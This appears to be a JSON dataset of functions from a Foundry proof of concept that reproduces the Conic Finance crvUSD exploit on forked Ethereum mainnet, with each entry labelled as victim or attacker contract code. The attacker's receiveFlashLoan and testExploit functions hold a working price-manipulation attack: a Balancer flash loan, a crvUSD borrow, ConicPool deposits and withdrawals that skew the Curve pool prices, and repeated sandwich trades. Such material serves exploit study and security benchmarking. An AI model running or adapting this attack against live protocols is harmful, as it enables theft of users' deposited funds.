[
  {
    "contract/interface": "IcrvUSDController",
    "source_type": "victim_contract",
    "function_name": "create_loan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IcrvUSDController",
    "source_type": "victim_contract",
    "function_name": "repay",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        crvUSDController.create_loan(80_000 ether, 93_000_000 ether, 10); // deposit WETH, borrow crvUSD\n\n        crvUSDToUSDCAndUSDT(19_000_000 ether, 27_000_000 ether); // swap crvUSD to USDT and USDC, crvUSD price reduction\n        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false); // deposit crvUSD to ConicPool, add crvUSD to crvUSD_USDT_Pool and crvUSD_USDC_Pool, crvUSD prices reduced further\n        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this))); // swap USDC and USDT to crvUSD, crvUSD prices increased, earn more crvUSD\n        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0); // withdraw cncCRVUSD from ConicPool, remove crvUSD from crvUSD_USDT_Pool and crvUSD_USDC_Pool, crvUSD prices increased\n\n        sandWich();\n        sandWich();\n        sandWich();\n\n        crvUSD_USDT_Pool.exchange(1, 0, 9_000_000 ether, 0); // swap crvUSD to USDT\n        crvUSD_USDC_Pool.exchange(1, 0, 12_000_000 ether, 0); // swap crvUSD to USDC\n        USDC.transfer(address(Balancer), amounts[0] + feeAmounts[0]);\n        address(USDT).call(\n            abi.encodeWithSignature(\"transfer(address,uint256)\", address(Balancer), amounts[2] + feeAmounts[2])\n        );\n\n        crvUSD_USDT_Pool.exchange(0, 1, USDT.balanceOf(address(this)), 0); // swap USDT to crvUSD\n        crvUSD_USDC_Pool.exchange(0, 1, USDC.balanceOf(address(this)), 0); // swap USDC to crvUSD\n        crvUSDController.repay(93_000_000 ether, address(this), int256(2 ** 255 - 1), false);\n        WETH.transfer(address(Balancer), amounts[1]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_743_470);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(crvUSD), \"crvUSD\");\n        vm.label(address(cncCRVUSD), \"cncCRVUSD\");\n        vm.label(address(ConicPool), \"ConicPool\");\n        vm.label(address(crvUSDController), \"crvUSDController\");\n        vm.label(address(crvUSD_USDT_Pool), \"crvUSD_USDT_Pool\");\n        vm.label(address(crvUSD_USDC_Pool), \"crvUSD_USDC_Pool\");\n        vm.label(address(Balancer), \"Balancer\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        USDC.approve(address(crvUSD_USDC_Pool), type(uint256).max);\n        address(USDT).call(\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(crvUSD_USDT_Pool), type(uint256).max)\n        );\n        WETH.approve(address(crvUSDController), type(uint256).max);\n        crvUSD.approve(address(crvUSDController), type(uint256).max);\n        crvUSD.approve(address(crvUSD_USDC_Pool), type(uint256).max);\n        crvUSD.approve(address(crvUSD_USDT_Pool), type(uint256).max);\n        crvUSD.approve(address(ConicPool), type(uint256).max);\n\n        address[] memory tokens = new address[](3);\n        tokens[0] = address(USDC);\n        tokens[1] = address(WETH);\n        tokens[2] = address(USDT);\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 12_000_000 * 1e6;\n        amounts[1] = 80_000 ether;\n        amounts[2] = 9_000_000 * 1e6;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"Attacker crvUSD balance after exploit\", crvUSD.balanceOf(address(this)), crvUSD.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IConicPool",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(\n        uint256 underlyingAmount,\n        uint256 minLpReceived\n    ) external override returns (uint256) {\n        return depositFor(msg.sender, underlyingAmount, minLpReceived, true);\n    }\n\n    /// @notice Deposit underlying\n    /// @param underlyingAmount Amount of underlying to deposit\n    /// @param minLpReceived The minimum amoun of LP to accept from the deposit\n    /// @param stake Whether or not to stake in the LpTokenStaker\n    /// @return lpReceived The amount of LP received\n",
    "description": ""
  },
  {
    "contract/interface": "IConicPool",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(\n        uint256 conicLpAmount,\n        uint256 minUnderlyingReceived\n    ) public override returns (uint256) {\n        // Preparing Withdrawals\n        require(lpToken.balanceOf(msg.sender) >= conicLpAmount, \"insufficient balance\");\n        uint256 underlyingBalanceBefore_ = underlying.balanceOf(address(this));\n\n        // Processing Withdrawals\n        (\n            uint256 totalUnderlying_,\n            uint256 allocatedUnderlying_,\n            uint256[] memory allocatedPerPool\n        ) = getTotalAndPerPoolUnderlying();\n        uint256 underlyingToReceive_ = conicLpAmount.mulDown(_exchangeRate(totalUnderlying_));\n        {\n            if (underlyingBalanceBefore_ < underlyingToReceive_) {\n                uint256 underlyingToWithdraw_ = underlyingToReceive_ - underlyingBalanceBefore_;\n                _withdrawFromCurve(allocatedUnderlying_, allocatedPerPool, underlyingToWithdraw_);\n            }\n        }\n\n        // Sending Underlying and burning LP Tokens\n        uint256 underlyingWithdrawn_ = _min(\n            underlying.balanceOf(address(this)),\n            underlyingToReceive_\n        );\n        require(underlyingWithdrawn_ >= minUnderlyingReceived, \"too much slippage\");\n        lpToken.burn(msg.sender, conicLpAmount);\n        underlying.safeTransfer(msg.sender, underlyingWithdrawn_);\n\n        _cachedTotalUnderlying = totalUnderlying_ - underlyingWithdrawn_;\n        _cacheUpdatedTimestamp = block.timestamp;\n\n        emit Withdraw(msg.sender, underlyingWithdrawn_);\n        return underlyingWithdrawn_;\n    }\n\n    function _withdrawFromCurve(\n        uint256 totalUnderlying_,\n        uint256[] memory allocatedPerPool,\n        uint256 amount_\n    ) internal {\n        uint256 withdrawalsRemaining_ = amount_;\n        uint256 totalAfterWithdrawal_ = totalUnderlying_ - amount_;\n\n        // NOTE: avoid modifying `allocatedPerPool`\n        uint256[] memory allocatedPerPoolCopy = allocatedPerPool.copy();\n\n        while (withdrawalsRemaining_ > 0) {\n            (uint256 curvePoolIndex_, uint256 maxWithdrawal_) = _getWithdrawPool(\n                totalAfterWithdrawal_,\n                allocatedPerPoolCopy\n            );\n            address curvePool_ = _curvePools.at(curvePoolIndex_);\n\n            // Withdrawing from least balanced Curve pool\n            uint256 toWithdraw_ = _min(withdrawalsRemaining_, maxWithdrawal_);\n            _withdrawFromCurvePool(curvePool_, toWithdraw_);\n            withdrawalsRemaining_ -= toWithdraw_;\n            allocatedPerPoolCopy[curvePoolIndex_] -= toWithdraw_;\n        }\n    }\n\n",
    "description": ""
  }
]